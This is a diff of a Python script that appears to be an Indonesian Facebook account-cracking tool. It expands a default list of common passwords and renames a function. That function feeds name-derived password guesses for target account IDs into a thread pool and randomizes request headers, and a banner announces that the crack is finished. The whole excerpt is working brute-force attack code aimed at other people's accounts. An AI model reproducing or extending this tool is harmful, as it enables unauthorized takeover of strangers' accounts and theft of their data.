@@ -1064,7 +1064,7 @@ def passwrd():
             for yuzong in id2:
                 idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                 frs = nmf.split(" ")[0]
-                pwv = ['anjing123','sayangku','maling123','sayang123','malang123','bismillah123']
+                pwv = ['pantek123','indonesia123','kontol123','domino123','anjing123','sayangku','maling123','sayang123','malang123','bismillah123']
                 if len(nmf)<6:
                     if len(frs)<3:
                         pass
@@ -1091,7 +1091,7 @@ def passwrd():
                     for xpwd in pwnya:
                         pwv.append(xpwd)
                 else:pass
-                pool.submit(regulerr,idf,pwv,awal)
+                pool.submit(reguler,idf,pwv,awal)
                 
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
@@ -1106,7 +1106,7 @@ def passwrd():
         exit()
 
 #--------------------[ METODE reguler ]-----------------#
-def regulerr(idf,pwv,awal):
+def reguler(idf,pwv,awal):
 	global loop,ok,cp
 	rr = random.randint
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
